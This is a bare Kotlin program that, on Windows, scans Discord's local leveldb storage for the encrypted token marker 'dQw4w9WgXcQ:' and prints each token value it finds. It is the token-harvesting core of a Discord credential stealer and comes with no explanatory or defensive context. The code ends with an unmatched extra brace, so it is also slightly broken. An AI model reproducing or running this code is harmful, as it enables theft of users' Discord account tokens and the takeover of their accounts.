import java.io.*
import java.util.regex.Pattern

fun main() {
    if (!(System.getProperty("os.name").contains("Windows"))) {
        println(System.getProperty("os.name"))
        return
    }

    val regex = "dQw4w9WgXcQ:"
    val files = File(System.getenv("APPDATA") + "\\discord\\Local Storage\\leveldb\\").listFiles()
    for (file in files!!) {
        BufferedReader(FileReader(file)).use { br ->
            var line: String?
            while (br.readLine().also { line = it } != null) {
                if (line!!.contains(regex)) {
                    println(line!!.split(regex)[1].split("\"")[0])
                }
            }
        }
    }
    }
}